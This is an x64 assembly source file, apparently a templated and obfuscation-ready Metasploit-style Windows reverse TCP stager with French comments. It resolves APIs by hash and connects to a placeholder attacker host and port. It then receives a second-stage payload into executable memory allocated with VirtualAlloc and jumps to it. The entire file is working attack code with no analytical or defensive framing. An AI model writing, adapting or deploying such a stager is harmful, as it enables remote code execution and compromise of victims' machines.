

_start:
    cld
    and rsp,byte -0x10
    call save_beginning

metasploit_block_api:
    push r9
    push r8
    xor rax,rax
    mov rax,0xff
    push rdx
    xor rdx,rdx
    xor rax,0x9f
    mov rax,[gs:rax] ; 0x60
    xor rax,%RANDOM__1%
    push rcx
    mov rdx,rax
    xor rdx,%RANDOM__1%
    mov rdx,[rdx+0x18]
    xor rdx,rax
    push rsi
    xor rdx,rax
    nop
    mov rdx,[rdx+0x20]

load_module_name:
    xor r9,r9
    mov rsi,[rdx+0x50]
    movzx rcx, word [rdx+0x4a]

module_hash_loop:
    xor rax,rax
    lodsb
    cmp al,0x61
    jl skip_case_adjustment
    sub al,0x20
skip_case_adjustment:
    ror r9d,%ROR_VALUE%
    add r9d,eax
    nop
    loop module_hash_loop

is_valid_module:
    push rdx
    push r9
    mov rdx,[rdx+0x20]
    mov eax,[rdx+0x3c]
    add rax,rdx
    cmp word [rax+0x18],0x20b
    jnz load_next_module

    mov eax,[rax+0x88]  ; offset de IMAGE_EXPORT_DIRECTORY
    test rax,rax
    jz load_next_module

    add rax,rdx
    mov r8d,[rax+0x20]
    mov ecx,[rax+0x18]
    push rax            ; On sauvegarde l'adresse de IMAGE_EXPORT_DIRECTORY
    add r8,rdx

find_function:
    jrcxz pre_load_next_module
    dec rcx
    xor r9,r9
    mov esi,[r8+rcx*4]
    add rsi,rdx

function_hash_loop:
    xor rax,rax
    ror r9d,%ROR_VALUE%
    lodsb
    add r9d,eax
    cmp al,ah
    jnz function_hash_loop

check:
    add r9,[rsp+0x8]
    cmp r9d,r10d
    jnz find_function

final:
    pop rax
    mov r8d,[rax+0x24]
    add r8,rdx
    mov cx,[r8+rcx*2]
    mov r8d,[rax+0x1c]
    add r8,rdx
    mov eax,[r8+rcx*4]
    add rax,rdx
    xor rax,%RANDOM__2%
    pop r8
    pop r8
    pop rsi
    pop rcx
    pop rdx
    pop r8
    pop r9
    pop r10
    sub rsp,byte 0x20
    push r10
    xor rax,%RANDOM__2%
    jmp rax

pre_load_next_module:
    pop rax
load_next_module:
    pop r9
    pop rdx
    mov rdx,[rdx]
    jmp load_module_name

save_beginning:
    pop rbp      ; rbp = @->beginning (metasploit_block_api)
    mov r14,0x32335f327377 ; Chaine de caractere "ws2_32"
    push r14
    mov r14,rsp  ; @ -> chaine au dessus
    sub rsp,0x1a0
    mov r13,rsp
    mov r12,%LHOST__LPORT%0002 ; 4 bytes for IP, 2 for the port
    push r12
    mov r12,rsp
    mov rcx,r14
    mov r10d,%HASH__kernel32.dll__LoadLibraryA% ; jump sur kernel32.LoadLibraryA("ws2_32")
    call rbp
    mov rdx,r13
    push qword 0x101
    pop rcx
    mov r10d,%HASH__ws2_32.dll__WSAStartup%   ; ws2_32.WSAStartup(0x101,WSADATA) (arguments à voir)
    call rbp            ; 2eme run
    push byte 0xa
    pop r14

to_rename_11f:
    push rax
    push rax
    xor r9,r9
    xor r8,r8
    inc rax
    mov rdx,rax
    inc rax
    mov rcx,rax
    mov r10d,%HASH__ws2_32.dll__WSASocketA% ; ws2_32.WSASocketA(0x2,0x1,0x0,0x0,?,0x1)
    call rbp            ; 3eme run 
    mov rdi,rax

to_rename_13e:
    push byte 0x10
    pop r8
    mov rdx,r12
    mov rcx,rdi
    mov r10d,%HASH__ws2_32.dll__connect% ; ws2_32.connect(0xD0,?,0x10)
    call rbp            ; 4eme run
    test eax,eax
    jz to_rename_15e   ; Si connexion TCP réussie on continue
    dec r14
    jnz to_rename_13e  ; Sinon on recommence
    call to_rename_1f1

to_rename_15e:
    sub rsp,byte 0x10
    mov rdx,rsp
    xor r9,r9
    push byte +0x4
    pop r8
    mov rcx,rdi
    mov r10d,%HASH__ws2_32.dll__recv% ; ws2_32.recv(0xd0,?,0x4) le ? similaire à au dessus à chaque fois
    call rbp            ; 5eme run
    cmp eax,byte 0x0
    jng to_rename_1d1
    nop
    add rsp,byte 0x20
    pop rsi
    mov esi,esi
    push byte 0x40
    pop r9
    push qword 0x1000
    pop r8
    mov rdx,rsi
    xor rcx,rcx
    mov r10d,%HASH__kernel32.dll__VirtualAlloc% ; kernel32.VirtualAlloc(0x0,?,0x1000,0x40)
    call rbp            ; 6eme run
    mov rbx,rax
    mov r15,rax

to_rename_1a2:
    xor r9,r9
    mov r8,rsi
    mov rdx,rbx
    mov rcx,rdi
    mov r10d,%HASH__ws2_32.dll__recv% ; ws2_32.recv(0xd0,?,0x4) le ? similaire à au dessus à chaque fois
    call rbp            ; 7eme run
    cmp eax,byte 0x0
    jnl to_rename_1e3
    pop rax
    push r15
    pop rcx
    push qword 0x4000
    pop r8
    push byte 0x0
    pop rdx
    mov r10d,%HASH__kernel32.dll__VirtualFree% ; kernel32.VirtualFree(?),0,0x4000)
    call rbp            ; 8eme run
    
to_rename_1d1:
    push rdi
    pop rcx
    mov r10d,%HASH__ws2_32.dll__closesocket% ; ws2_32.closesocket(0xd0)
    call rbp            ; 9eme run
    dec r14
    jmp to_rename_11f
to_rename_1e3:
    add rbx,rax
    sub rsi,rax
    test rsi,rsi
    jnz to_rename_1a2
    jmp r15

to_rename_1f1:
    pop rax
    push byte 0x0
    pop rcx
    mov r10,%HASH__kernel32.dll__ExitProcess% ; kernel32.ExitProcess(0)
    call rbp                                 ; 10eme run
